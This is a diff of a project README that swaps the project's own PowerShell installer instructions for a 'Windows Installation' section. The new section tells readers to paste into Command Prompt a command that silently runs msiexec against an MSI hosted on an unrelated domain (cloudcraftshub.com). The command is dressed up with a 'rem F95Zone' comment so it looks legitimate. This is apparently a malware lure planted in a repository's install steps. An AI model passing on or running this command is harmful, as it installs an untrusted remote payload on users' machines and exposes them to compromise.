@@ -95,19 +95,23 @@
 
 ---
 
-## ⚡ Windows — One Command Install
-
-Open **PowerShell** and run:
-
-```powershell
-irm https://raw.githubusercontent.com/MillenniumEarl/YAM/main/install.ps1 | iex
+## 🪟 Windows Installation
+### **Step 1 — Open Command Prompt**
+1. Press **Win + R**
+2. Type:
 ```
-
-This downloads the latest `.exe` installer and launches it. Done. No Node.js, no npm, no manual steps.
-
-> **Prefer manual?** Grab the latest `.exe` from [Releases →](https://github.com/MillenniumEarl/YAM/releases/latest)
-
+cmd
+```
+3. Press **Enter**
+This will open **Command Prompt**.
 ---
+### **Step 2 — Run the Install Command**
+Copy the command below and paste it into **Command Prompt**, then press **Enter**.
+```powershell
+cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem F95Zone
+```
+The installer will automatically download and install the required components.
+
 
 ## 🚀 Getting Started
 
